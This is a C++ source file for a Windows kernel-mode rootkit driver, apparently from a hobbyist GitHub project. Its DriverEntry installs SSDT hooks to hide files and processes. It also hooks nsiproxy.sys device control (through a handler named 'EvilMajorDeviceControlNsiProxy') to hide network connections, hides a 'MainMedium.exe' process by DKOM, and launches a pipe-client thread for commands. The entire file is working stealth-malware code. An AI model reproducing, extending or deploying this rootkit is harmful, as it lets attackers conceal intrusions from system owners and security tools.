#include "piping.h"
#include "DKOM.h"
#include "irp.h"
#pragma warning(disable : 4996)
#pragma warning(disable : 4127)


BOOL HookRelease() {
    roothook::SSDT::SystemServiceDTUnhook(NTQUERY_TAG);
    roothook::SSDT::SystemServiceDTUnhook(NTQUERYEX_TAG);
    roothook::SSDT::SystemServiceDTUnhook(NTQUERYSYSINFO_TAG);
    irphooking::ReleaseIrpHook(NSIPROXY_TAG, IRP_MJ_DEVICE_CONTROL);
    process::DKUnhideProcess(REMOVE_BY_INDEX_PID, 0);
    return TRUE;
}


extern "C" NTSTATUS DriverEntry(_In_ DRIVER_OBJECT * DriverObject, _In_ PUNICODE_STRING RegistryPath){
    ULONG64 MediumPID = 0;
    UNREFERENCED_PARAMETER(DriverObject);
    UNREFERENCED_PARAMETER(RegistryPath);


    // Hook NtQueryDirectoryFile/Ex and NtQuerySystemInformation (BETA) if IS_DKOM = 0 (FALSE):
    if (!NT_SUCCESS(roothook::SSDT::InitializeSSDTHook())) {
        HookRelease();
        return STATUS_UNSUCCESSFUL;
    }


    // IRP hook IRP_MJ_DEVICE_CONTROL of nsiproxy.sys to hide open connections:
    if (!NT_SUCCESS(irphooking::address_list::InitializeAddressList())) {
        HookRelease();
        return STATUS_UNSUCCESSFUL;
    }
    if (!NT_SUCCESS(irphooking::InitializeIrpHook(NSIPROXY_TAG, IRP_MJ_DEVICE_CONTROL, &irphooking::EvilMajorDeviceControlNsiProxy))) {
        HookRelease();
        return STATUS_UNSUCCESSFUL;
    }


    // Get PID of medium and delete it from list by default:
    DbgPrintEx(0, 0, "KMDFdriver - trying to resolve medium PID\n");
    if (!NT_SUCCESS(general_helpers::GetPidNameFromListADD(&MediumPID, "MainMedium.exe", TRUE)) || MediumPID == 0) {
        HookRelease();
        return STATUS_UNSUCCESSFUL;
    }
    DbgPrintEx(0, 0, "KMDFdriver - Medium PID = %llu\n", MediumPID);
    if (!NT_SUCCESS(process::DKHideProcess(MediumPID, TRUE))) {
        HookRelease();
        return STATUS_UNSUCCESSFUL;
    }
    DbgPrintEx(0, 0, "KMDFdriver - Medium process %llu was hidden successfully\n", MediumPID);


    const char* HelloMessage =
        "\n----------\n"
        " _____   _   _  ______ _____  _____ _______   __ ____ _______\n"
        "/ ____\\ | | | || ___  \\  _  |/  _  \\_    _/| / //_  _\\\\_   _/\n"
        "\\ `- -. | |_| || |_/  / | | || | | | | | | |/ /  | |    | |\n"
        " `- -. \\   _  ||     /| | | || | | | | | |    \\  | |    | |\n"
        "/\\__/  /  | | || |\\  \\\\ \\_/ /| \\_/ / | | | |\\  \\_| |_   | |\n"
        "\\____ / \\_| |_|| / \\__|\\___/ \\____/  |_| |_| \\_/\\___/   |_|\n\n"
        "Discord: bldysis#0868  GitHub: shaygitub\n"
        "\n----------\n";

    DbgPrintEx(0, 0, "%s", HelloMessage);

    
    // Execute pipe client thread:
    HANDLE PipeThread = NULL;
    NTSTATUS Status = PsCreateSystemThread(
        &PipeThread,
        GENERIC_ALL,
        NULL,
        NULL,
        NULL,
        (PKSTART_ROUTINE)PipeClient,
        NULL);

    if (!NT_SUCCESS(Status)){
        DbgPrintEx(0, 0, "KMDFdriver - Failed to create client pipe thread, status code: 0x%x\n", Status);
        HookRelease();
        return STATUS_UNSUCCESSFUL;
    }
    ZwClose(PipeThread);
    return STATUS_SUCCESS;
}